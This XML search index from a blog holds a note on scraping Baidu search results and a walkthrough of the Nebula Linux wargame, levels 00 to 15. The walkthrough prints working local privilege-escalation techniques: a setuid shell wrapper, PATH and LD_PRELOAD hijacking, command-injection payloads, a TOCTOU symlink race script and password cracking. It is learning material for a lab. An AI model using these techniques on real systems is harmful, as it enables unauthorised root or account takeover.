<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[百度搜索结果爬取]]></title>
    <url>%2F2018%2F11%2F30%2F%E7%99%BE%E5%BA%A6%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C%E7%88%AC%E5%8F%96%2F</url>
    <content type="text"><![CDATA[粗略看了下BeautifulSoup，准备练习爬取百度的搜索，以备后续使用。 百度的搜索结果其实是十分有特点， 在看了返回的Html原文以后可以很随便写出来 1.百度搜索URL我在百度随便搜索关键词BeautifulSoup 就可以看到百度的搜索url为 https://www.baidu.com/s?wd=BeautifulSoup&amp;XXXXXXXXX 我们很容易可以看出我们的URL就是https://www.baidu.com/s?wd= 2. 百度的搜索结果html原文根据浏览器的调试功能可以很轻易的找出百度每条搜索结果的html代码为 12345678910111213141516171819202122232425262728293031323334&lt;div class="result c-container " id="1" srcid="1599" tpl="se_com_default" data-click="&#123;&amp;quot;rsv_bdr&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;p5&amp;quot;:1&#125;"&gt; &lt;h3 class="t c-title-en"&gt; &lt;a data-click="&#123;'F':'778317EA','F1':'9D73F1E4','F2':'4CA6DE6B','F3':'54E5343F','T':'1543569046','y':'FBFFF9F5'&#125;" href="http://www.baidu.com/link?url=FAwy75exYe8mNFRV4wgYMcDUnAKoX8yBLOSN7RkAyniwM-5sFBwju3qt9epNC16C4s6y0G-2yMH_MPrU9718t4hnCO0n9qqSzzNS1rmn2cm&amp;amp;ck=0.0.0.0.0.0.0.0&amp;amp;shh=www.baidu.com&amp;amp;sht=baiduhome_pg" target="_blank"&gt;&lt;em&gt;Beautiful Soup&lt;/em&gt; Documentation — &lt;em&gt;Beautiful Soup&lt;/em&gt; 4.4.0 ... &lt;/a&gt; &lt;/h3&gt; &lt;div class="c-row c-gap-top-small"&gt; &lt;div class="general_image_pic c-span6"&gt; &lt;a class="c-img6" style="height:75px" href="http://www.baidu.com/link?url=FAwy75exYe8mNFRV4wgYMcDUnAKoX8yBLOSN7RkAyniwM-5sFBwju3qt9epNC16C4s6y0G-2yMH_MPrU9718t4hnCO0n9qqSzzNS1rmn2cm&amp;amp;ck=0.0.0.0.0.0.0.0&amp;amp;shh=www.baidu.com&amp;amp;sht=baiduhome_pg" target="_blank"&gt;&lt;img class="c-img c-img6" src="https://ss0.baidu.com/73t1bjeh1BF3odCf/it/u=325232897,2575160110&amp;amp;fm=85&amp;amp;s=0F87C5005DF7CDEB083DE1CB010060B1" style="height:75px;"&gt; &lt;/a&gt; &lt;/div&gt; &lt;div class="c-span18 c-span-last"&gt; &lt;div class="m"&gt;查看此网页的中文翻译，请点击&amp;nbsp; &lt;a href="http://www.baidu.com/link?url=LD9ASPT3kiwXjR_dIpiCc_grO8maTutdVc0m6Kk2jM6I5zpec_VW23HxQZ0hHCaegSN9Ra0ZRYD80nWQjzbf39u74N6JCBZLMY8VMWTJFtN1yGtub8R6fl3atO21lhWeeF-10Y29NpYMi3NtO_K7dTMZz-jF-MRpotV5ll1ItAa7tyVOEWNw93FEw0_hus269w5MJMhmvEVY94FJ7w2HExnTL0HKkWCNNYu9sYNH-K7zLGyVwP3v_WKNyKjzpMZB&amp;amp;ck=1216.4.0.0.0.230.412.0&amp;amp;shh=www.baidu.com&amp;amp;sht=baiduhome_pg" target="_blank" class="m"&gt;翻译此页 &lt;/a&gt; &lt;/div&gt; &lt;div class="c-abstract c-abstract-en"&gt; from bs4 import &lt;em&gt;BeautifulSoup&lt;/em&gt; soup = &lt;em&gt;BeautifulSoup&lt;/em&gt;(html_doc, 'html.parser') print(soup.prettify()... &lt;/div&gt; &lt;div class="f13"&gt; &lt;a target="_blank" href="http://www.baidu.com/link?url=FAwy75exYe8mNFRV4wgYMcDUnAKoX8yBLOSN7RkAyniwM-5sFBwju3qt9epNC16C4s6y0G-2yMH_MPrU9718t4hnCO0n9qqSzzNS1rmn2cm&amp;amp;ck=0.0.0.0.0.0.0.0&amp;amp;shh=www.baidu.com&amp;amp;sht=baiduhome_pg" class="c-showurl" style="text-decoration:none;"&gt;https://www.crummy.com/softwar...&amp;nbsp; &lt;/a&gt; &lt;div class="c-tools" id="tools_2933620390008844611_1" data-tools="&#123;&amp;quot;title&amp;quot;:&amp;quot;Beautiful Soup Documentation — Beautiful Soup 4.4.0 ...&amp;quot;,&amp;quot;url&amp;quot;:&amp;quot;http://www.baidu.com/link?url=FAwy75exYe8mNFRV4wgYMcDUnAKoX8yBLOSN7RkAyniwM-5sFBwju3qt9epNC16C4s6y0G-2yMH_MPrU9718t4hnCO0n9qqSzzNS1rmn2cm&amp;quot;&#125;"&gt; &lt;a class="c-tip-icon"&gt;&lt;i class="c-icon c-icon-triangle-down-g"&gt;&lt;/i&gt; &lt;/a&gt; &lt;/div&gt; &lt;span class="c-icons-outer"&gt; &lt;span class="c-icons-inner"&gt;&lt;/span&gt; &lt;/span&gt;&amp;nbsp;-&amp;nbsp; &lt;a data-click="&#123;'rsv_snapshot':'1'&#125;" href="http://cache.baiducontent.com/c?m=9d78d513d99316fc1fabcf2a4a48c0676915dd247ec3975521dbc90ed5261a564615fea662675513d3b22d2746f01617fdf041236a5c3df6c69cce0f8efbc5355fdf74733647d2064cb244e8895b7580268d0cb4fe04bce6a665d9b9d2a485120c94&amp;amp;p=9b759a46d6c615f010be9b7c6151a5&amp;amp;newp=aa769a4782934eac58e8d4354f4f88231610db2151d4d0106b82c825d7331b001c3bbfb423261000d3ce7c6201a94a5be8f732763d0923a3dda5c91d9fb4c57479dc&amp;amp;user=baidu&amp;amp;fm=sc&amp;amp;query=BeautifulSoup&amp;amp;qid=8f9f7bf2000084c8&amp;amp;p1=1" target="_blank" class="m"&gt;百度快照 &lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 可以很容易看出包含结果的div的类是c-container ，其中的&lt;h3&gt;是标题，剩下的c-abstract是我们想要的摘要和百度收录时间(如果有)。 那么网页的原始URL呢？我们可以通过访问标题的链接，通过百度的重定向获取到。 3. 百度搜索结果翻页这里我直接参考了别人的处理结果，在URL后面加入&amp;pn=参数， https://www.baidu.com/s?wd=BeautifulSoup&amp;pn=10 pn=10代表第二页，百度的每页条数是10条，那么，我们爬取第K页的时候，应该填写10*(K-1) 4. 最后代码最后的代码可参考github]]></content>
      <tags>
        <tag>Exercises</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux练习]]></title>
    <url>%2F2018%2F11%2F28%2Flinux%E7%BB%83%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[本实验获取flag的标志是 You have successfully executed getflag on a target account 通用的getshell是123456789101112131415161718#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdio.h&gt; int main(int argc, char **argv, char **envp) &#123; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); system(&quot;/bin/bash&quot;); &#125; 这里我们可以简化成system(“/bin/getflag”); level00About This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories. Alternatively, look at the find man page. To access this level, log in as level00 with the password of level00.z WP很明显这是个学习find命令的作业 find / -name &quot;*set*id&quot;#查找名字为set Id的文件 find / -group cat# 查找在系统中属于 groupcat的文件 find / -amin -10 # 查找在系统中最后10分钟访问的文件 find / -atime -2 # 查找在系统中最后48小时访问的文件 find / -empty # 查找在系统中为空的文件或者文件夹 find / -mmin -5 # 查找在系统中最后5分钟里修改过的文件 find / -mtime -1 #查找在系统中最后24小时里修改过的文件 find / -nouser #查找在系统中属于作废用户的文件 find / -user fred #查找在系统中属于FRED这个用户的文件 find / -maxdepth 2#用于限制查找层数 find / -size +1g #用于限制查找大小 find / -perm 755#用于限制权限 -perm mode:文件许可正好符合mode -perm +mode:文件许可部分符合mode -perm -mode: 文件许可完全符合mode 命令find . -type f -perm +6000就是指定目录下所有具有suid/sgid的程序 find / -perm +0 -user flag00 2&gt;/dev/null获取第一个文件 /bin/…/flag00就执行可以了 level01AboutThere is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01. Source123456789101112131415161718#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv, char **envp)&#123; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); system(&quot;/usr/bin/env echo and now what?&quot;);&#125; WP运行/home/flag01/flag01输出and now what?flag01这里调用了echo命令用/bin/bash我们代替echo123echo -e &apos;#/bin/bash\r\n/bin/bash&apos; &gt; /tmp/echochmod +x /tmp/echo/home/flag01/flag01 ==没有弄明白== level02AboutThere is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02. Source1234567891011121314151617181920212223242526#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv, char **envp)&#123; char *buffer; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); buffer = NULL; asprintf(&amp;buffer, &quot;/bin/echo %s is cool&quot;, getenv(&quot;USER&quot;)); printf(&quot;about to call system(\&quot;%s\&quot;)\n&quot;, buffer); system(buffer);&#125; WP运行/home/flag02/flag02得到输出 about to call system(“/bin/echo level02 is cool”)level02 is cool 看源码，获取了环境变量user。验证下输入命令env得到123456789101112131415161718TERM=xtermSHELL=/bin/shSSH_CLIENT=192.168.2.1 5024 22SSH_TTY=/dev/pts/1USER=level02LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:MAIL=/var/mail/level02PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/gamesPWD=/home/level02LANG=en_US.UTF-8SHLVL=1HOME=/home/level02LANGUAGE=en_US:LOGNAME=level02SSH_CONNECTION=192.168.2.1 5024 192.168.2.3 22LESSOPEN=| /usr/bin/lesspipe %sLESSCLOSE=/usr/bin/lesspipe %s %s_=/usr/bin/env 更改环境变量为USER=&quot;;getflag&quot;就得到flag level03AboutCheck the home directory of flag03 and take note of the files there.There is a crontab that is called every couple of minutes.To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03. WPflag03中有个定时任务，我们看看这个定时任务 writable.sh123456#!/bin/shfor i in /home/flag03/writable.d/* ; do (ulimit -t 5; bash -x &quot;$i&quot;) rm -f &quot;$i&quot;done ulimit -t 5是限制CPU使用时间的 bash -x &quot;$i&quot;是运行文件i echo &quot;getflag &gt; /tmp/flag&quot; &gt; /home/flag03/writable.d/run在/home/flag03/writable.d/中加入runrun的内容是运行getflag过两分钟后看看/tmp/flag，得到flag level04AboutThis level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04. Source1234567891011121314151617181920212223242526272829303132333435#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char **argv, char **envp)&#123; char buf[1024]; int fd, rc; if(argc == 1) &#123; printf(&quot;%s [file to read]\n&quot;, argv[0]); exit(EXIT_FAILURE); &#125; if(strstr(argv[1], &quot;token&quot;) != NULL) &#123; printf(&quot;You may not access &apos;%s&apos;\n&quot;, argv[1]); exit(EXIT_FAILURE); &#125; fd = open(argv[1], O_RDONLY); if(fd == -1) &#123; err(EXIT_FAILURE, &quot;Unable to open %s&quot;, argv[1]); &#125; rc = read(fd, buf, sizeof(buf)); if(rc == -1) &#123; err(EXIT_FAILURE, &quot;Unable to read fd %d&quot;, fd); &#125; write(1, buf, rc);&#125; WPflag04中包含flag04程序，和token，token是level04没有读取权限的，flag04有我们尝试下flag04的作用echo &quot;0&quot; &gt;/tmp/flag04;/home/flag04/flag04 /tmp/flag04输出为0。flag04就是读取文件的。但是有个过滤，文件名不能含有token if(strstr(argv[1], &quot;token&quot;) != NULL)那么我们ln -s /home/flag04/token /tmp/flag04接着运行/home/flag04/flag04 /tmp/flag04 结果就能输出token内容这个内容就是flag04的密码 level05AboutCheck the flag05 home directory. You are looking for weak directory permissionsTo do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05. WP在/home/flag05中仔细找找ls -al发现.backup文件夹，文件夹中有个压缩文件解压后发现这是ssh的密钥备份文件把.ssh放到level05的用户目录，这样就有凭借这些密钥ssh免密码登录flag05账户了ssh flag05@localhost 就可以了 level06AboutThe flag06 account credentials came from a legacy unix system.To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06. WPflag06的是传统的UNIX的方式保存，密文存在/etc/passwd文件中。发行版的密码存在/etc/shadow中cat /etc/passwd | grep flag06可以得出 flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh 利用john破解下就能得到密码了 level07AboutThe flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07. Source123456789101112131415161718192021#!/usr/bin/perluse CGI qw&#123;param&#125;;print &quot;Content-type: text/html\n\n&quot;;sub ping &#123; $host = $_[0]; print(&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;); @output = `ping -c 3 $host 2&gt;&amp;1`; foreach $line (@output) &#123; print &quot;$line&quot;; &#125; print(&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;); &#125;# check if Host set. if not, display normal page, etcping(param(&quot;Host&quot;)); WP我没有在实体机打开http://192.168.2.1:7007/index.cgi?Host=127.0.0.1得到ping的内容,发现也可以本地运行/home/flag07/flag07/index.cgi Host=127.0.0.11@output = `ping -c 3 $host 2&gt;&amp;1` 这里包含典型的命令执行，我们是下/home/flag07/flag07/index.cgi Host=127.0.0.1;whoami后面多了level07 说明本地运行是level07用户跑的写个html方便命令执行123456789&lt;html&gt;&lt;head&gt;&lt;title&gt;test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://192.168.2.3:7007/index.cgi&quot; method=&quot;get&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;Host&quot;/&gt;&lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 在输入框输入127.0.0.1;whoami输出结果后面多了flag07证明我们成功命令执行了把whoami改为getflag就行了 level08AboutWorld readable files strike again. Check what that user was up to, and use it to log into flag08 account.To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08. WPstrings capture.pcap | grep Pass搜索包含String的字符得到 Nf&amp;Nat 看不懂还是拿出来直接wireShark分析吧第一条流就得到 Password: backdoor…00Rm8.ate 查证得到.是删除的意思那么手动输入下得到密码 backd00Rmate level09AboutThere’s a C setuid wrapper for some vulnerable PHP code…To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09. Source1234567891011121314151617181920212223242526&lt;?phpfunction spam($email)&#123; $email = preg_replace(&quot;/\./&quot;, &quot; dot &quot;, $email); $email = preg_replace(&quot;/@/&quot;, &quot; AT &quot;, $email); return $email;&#125;function markup($filename, $use_me)&#123; $contents = file_get_contents($filename); $contents = preg_replace(&quot;/(\[email (.*)\])/e&quot;, &quot;spam(\&quot;\\2\&quot;)&quot;, $contents); $contents = preg_replace(&quot;/\[/&quot;, &quot;&lt;&quot;, $contents); $contents = preg_replace(&quot;/\]/&quot;, &quot;&gt;&quot;, $contents); return $contents;&#125;$output = markup($argv[1], $argv[2]);print $output;?&gt; 这个就是匹配文件中的emal地址，然后进行转换：.转为dot，@转为AT，试验下echo &quot;[email AAA@BBB.CCC.DDD]&quot;&gt;/tmp/email;/home/flag09/flag09 /tmp/email输出结果为 AAA AT BBB dot CCC dot DDD preg_replace在/e命令下，第二个参数会被代码执行那么我们修改email文件内容为 [email &quot;{${phpinfo()}}&quot;] 运行程序发现打出php信息 [email &quot;{${system(getflag)}}&quot;] level10AboutThe setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.To do this level, log in as the level10 account with the password level10. Files for this level can be found in /home/flag10. Source12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv)&#123; char *file; char *host; if(argc &lt; 3) &#123; printf(&quot;%s file host\n\tsends file to host if you have access to it\n&quot;, argv[0]); exit(1); &#125; file = argv[1]; host = argv[2]; if(access(argv[1], R_OK) == 0) &#123; int fd; int ffd; int rc; struct sockaddr_in sin; char buffer[4096]; printf(&quot;Connecting to %s:18211 .. &quot;, host); fflush(stdout); fd = socket(AF_INET, SOCK_STREAM, 0); memset(&amp;sin, 0, sizeof(struct sockaddr_in)); sin.sin_family = AF_INET; sin.sin_addr.s_addr = inet_addr(host); sin.sin_port = htons(18211); if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) &#123; printf(&quot;Unable to connect to host %s\n&quot;, host); exit(EXIT_FAILURE); &#125;#define HITHERE &quot;.oO Oo.\n&quot; if(write(fd, HITHERE, strlen(HITHERE)) == -1) &#123; printf(&quot;Unable to write banner to host %s\n&quot;, host); exit(EXIT_FAILURE); &#125;#undef HITHERE printf(&quot;Connected!\nSending file .. &quot;); fflush(stdout); ffd = open(file, O_RDONLY); if(ffd == -1) &#123; printf(&quot;Damn. Unable to open file\n&quot;); exit(EXIT_FAILURE); &#125; rc = read(ffd, buffer, sizeof(buffer)); if(rc == -1) &#123; printf(&quot;Unable to read from file: %s\n&quot;, strerror(errno)); exit(EXIT_FAILURE); &#125; write(fd, buffer, rc); printf(&quot;wrote file!\n&quot;); &#125; else &#123; printf(&quot;You don&apos;t have access to %s\n&quot;, file); &#125;&#125; WP直接找了答案This is commonly called a time-of-use to time-of-check or TOCTOU bug (Wikipedia’s example is pretty much exactly the same issue)在/tmp/建立token10 touch /tmp/token代码EOC1123456#! /bin/bashwhile truedo ln -fs /tmp/token /tmp/token10 ln -fs /home/flag10/token /tmp/token10done 代码意思不停的建立软连接token连接到token10，连接/home/flag10/token连接到 token10一开始/tmp/token10是有权限的(就是/tmp/token)，但是后来是没有权限的(就是/home/flag10/token)代码EOC212345#! /bin/bashwhile truedo nice -n 19 /home/flag10/flag10 /tmp/token10 127.0.0.1done nice命令适用于以指定的进程调度优先级启动其他的程序。优先级是从-20～19 数字越小优先级越高我们开3个ssh端口运行nc -k -l 127.0.0.1 18211,EOC1,EOC2。接下来就是看脸了,nc的端口获取到flag10密码 level11这题题目出现了问题，有人重新编译了源码getflag成功了 AboutThe /home/flag11/flag11 binary processes standard input and executes a shell command.There are two ways of completing this level, you may wish to do both :-)To do this level, log in as the level11 account with the password level11. Files for this level can be found in /home/flag11. Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;/* * Return a random, non predictable file, and return the file descriptor for it. */int getrand(char **path)&#123; char *tmp; int pid; int fd; srandom(time(NULL)); tmp = getenv(&quot;TEMP&quot;); pid = getpid(); asprintf(path, &quot;%s/%d.%c%c%c%c%c%c&quot;, tmp, pid, &apos;A&apos; + (random() % 26), &apos;0&apos; + (random() % 10), &apos;a&apos; + (random() % 26), &apos;A&apos; + (random() % 26), &apos;0&apos; + (random() % 10), &apos;a&apos; + (random() % 26)); fd = open(*path, O_CREAT|O_RDWR, 0600); unlink(*path); return fd;&#125;void process(char *buffer, int length)&#123; unsigned int key; int i; key = length &amp; 0xff; for(i = 0; i &lt; length; i++) &#123; buffer[i] ^= key; key -= buffer[i]; &#125; system(buffer);&#125;#define CL &quot;Content-Length: &quot;int main(int argc, char **argv)&#123; char line[256]; char buf[1024]; char *mem; int length; int fd; char *path; if(fgets(line, sizeof(line), stdin) == NULL) &#123; errx(1, &quot;reading from stdin&quot;); &#125; if(strncmp(line, CL, strlen(CL)) != 0) &#123; errx(1, &quot;invalid header&quot;); &#125; length = atoi(line + strlen(CL)); if(length &lt; sizeof(buf)) &#123; if(fread(buf, length, 1, stdin) != length) &#123; err(1, &quot;fread length&quot;); &#125; process(buf, length); &#125; else &#123; int blue = length; int pink; fd = getrand(&amp;path); while(blue &gt; 0) &#123; printf(&quot;blue = %d, length = %d, &quot;, blue, length); pink = fread(buf, 1, sizeof(buf), stdin); printf(&quot;pink = %d\n&quot;, pink); if(pink &lt;= 0) &#123; err(1, &quot;fread fail(blue = %d, length = %d)&quot;, blue, length); &#125; write(fd, buf, pink); blue -= pink; &#125; mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0); if(mem == MAP_FAILED) &#123; err(1, &quot;mmap&quot;); &#125; process(mem, length); &#125;&#125; WP代码首先检查了Content-Length:字符串，后面跟的数字如果小于1024，那么进入方法1，否则进入方法2。前后两个方法都用了fread读入字符串字符串这个函数，这个函数有个问题： 方法1返回值会为1 方法2返回值为输入字符个数WP1 mark一下atoi函数 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123; int val; char str[20]; strcpy(str, &quot;98993489&quot;); val = atoi(str); printf(&quot;字符串值 = %s, 整型值 = %d\n&quot;, str, val); strcpy(str, &quot;runoob.com&quot;); val = atoi(str); printf(&quot;字符串值 = %s, 整型值 = %d\n&quot;, str, val); return(0);&#125;字符串值 = 98993489, 整型值 = 98993489字符串值 = runoob.com, 整型值 = 0也就是&apos;Content-Length: 1\nE&apos; 结果是1 仔细读代码可以发现 输入的长度1 按位与了255，结果还是一，然后E^1成为D，但是这个过程要等待buf清空大牛进行了一次实验 echo -ne “Content-Length: 1\nE” | /home/flag11/flag11sh: $’Dp\324’: command not found 发现E变成了D，后面数字每次都会不同，有的时候会出现 sh: D: command not found 这个就是代码执行。那么，在tmp目录下用软连接方法，ln -s /bin/getflag D，将tmp加入pathexport PATH=/tmp/:$PATH，接着运行echo -ne &quot;Content-Length: 1\nE&quot; | /home/flag11/flag11可惜失败了 getflag is executing on a non-flag account, this doesn’t count 这里用了一个技术TODO==技术使用叫做LD_PRELOAD的环境变量，LD_PRELOAD平常用于重写调试信息，它能控制堆栈信息，这意味着我们不用随机获取堆栈，我们可以控制堆栈1export LD_PRELOAD=`python -c &apos;print &quot;/bin/getflag\x0a&quot;*1000&apos;` 再次运行flag11，他会重复执行getflag WP2这里关注长度大于1024的方法，既然我们知道了命令的加密方法，那我们反加密命令 EOC c代码123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main (int argc, char *argv[])&#123; int length =1024; char *cmd = &quot;getflag&quot;; char buf[1024]; int key = length &amp; 0xff; int i=0; //把命令放入buf中其余为空 strncpy(buf,cmd,1024); for(;i&lt;length;i++) &#123; buf[i]=buf[i]^key; key = key -(buf[i]^key); &#125; puts(&quot;Content-Length: 1024&quot;); //输出到控制台 fwrite(buf,1,length,stdout); return 0;&#125; EOC python 代码1234567891011string = &quot;/bin/getflag\x00&quot;key = 0enc_string = &quot;&quot;for char in string: enc_char = ord(char) ^ key &amp; 0xff enc_string += chr(enc_char) key = key - ord(char) &amp; 0xffprint &quot;Content-Length: 1024\n&quot; + enc_string + &quot;\x00&quot; * (1024 - len(enc_string)) 整个环境在TEMP这个环境变量中，我们要把TEMP切换到EOC的环境下 WP3有一个人声称自己用了ssh注入的方式getflag 链接 level12AboutThere is a backdoor process listening on port 50001.To do this level, log in as the level12 account with the password level12. Files for this level can be found in /home/flag12. Source123456789101112131415161718192021222324252627282930313233local socket = require(&quot;socket&quot;)local server = assert(socket.bind(&quot;127.0.0.1&quot;, 50001))function hash(password) prog = io.popen(&quot;echo &quot;..password..&quot; | sha1sum&quot;, &quot;r&quot;) data = prog:read(&quot;*all&quot;) prog:close() data = string.sub(data, 1, 40) return dataendwhile 1 do local client = server:accept() client:send(&quot;Password: &quot;) client:settimeout(60) local line, err = client:receive() if not err then print(&quot;trying &quot; .. line) -- log from where ;\ local h = hash(line) if h ~= &quot;4754a4f4bd5787accd33de887b9250a0691dd198&quot; then client:send(&quot;Better luck next time\n&quot;); else client:send(&quot;Congrats, your token is 413**CARRIER LOST**\n&quot;) end end client:close()end WP 什么是Lua Lua 是一种轻量小巧的脚本语言，用标准C语言编写并以源代码形式开放， 其设计目的是为了嵌入应用程序中，从而为应用程序提供灵活的扩展和定制功能。 什么是… 在lua中可以使用…表示可变长参数，在函数内通过表访问可变参数 io.popen中存在代码执行，我们把password伪装一下，让他帮我们编译一个程序，getshell也行，getflag也行 password=1; gcc -o /tmp/shell /tmp/shell.c; cp /tmp/shell /home/flag12; chmod +s /home/flag12/shell ;echo 1 level13AboutThere is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.To do this level, log in as the level13 account with the password level13. Files for this level can be found in /home/flag13. Source123456789101112131415161718192021222324#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;string.h&gt;#define FAKEUID 1000int main(int argc, char **argv, char **envp)&#123; int c; char token[256]; if(getuid() != FAKEUID) &#123; printf(&quot;Security failure detected. UID %d started us, we expect %d\n&quot;, getuid(), FAKEUID); printf(&quot;The system administrators will be notified of this violation\n&quot;); exit(EXIT_FAILURE); &#125; // snip, sorry :) printf(&quot;your token is %s\n&quot;, token); &#125; WPWP1第一种方式是玩GDB设置状态为$eax 为源代码所写的1000GDB的用法为 gdb file(gdb)r 表示运行(gdb)b [函数名|行数(未混淆)] 设置断点(gdb) s/si 单步运行(/源码汇编)(gdb) l/list 列出源码(gdb) disas 列出汇编(gdb) info 打出信息 如：r/regist 打出内存信息 简略可参考这里详细可参考这里 WP2劫持getuid的函数。这里用到LD_PRELOAD环境变量。LD_PRELOAD可以影响程序运行时的链接，这个变量允许你定义在程序运行时优先加载的动态链接库。 新建我们的getuid12#include &lt;sys/types.h&gt;uid_t getuid(void) &#123;return 1000;&#125; 编译gcc -shared -fPIC mygetuid.c -o mygetuid.so放入LD_PRELOADexport LD_PRELOAD=&quot;/home/level13/mygetuid.so&quot;。大牛提示 这里需要注意一点，需要将/home/flag13/flag13复制到/home/level13/下面运行才可以，因为需要flag13和这个so文件的ruid是一样的才可以。 运行flag13获取token level14AboutThis program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)To do this level, log in as the level14 account with the password level14. Files for this level can be found in /home/flag14.尝试输入./flag13 -e 111:输出为123。也就是按位加i于是写出加解密代码123456789101112def encrypt(str): result = &quot;&quot; for i in range(0,len(str)): result += chr(ord(str[i])+i); return result;def decrypt(str): result = &quot;&quot; for i in range(0, len(str)): result += chr(ord(str[i]) - i); return resultstr = decrypt(&quot;857:g67?5ABBo:BtDA?tIvLDKL&#123;MQPSRQWW.&quot;);print str; level15Aboutstrace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.Clean up after yourself :)To do this level, log in as the level15 account with the password level15. Files for this level can be found in 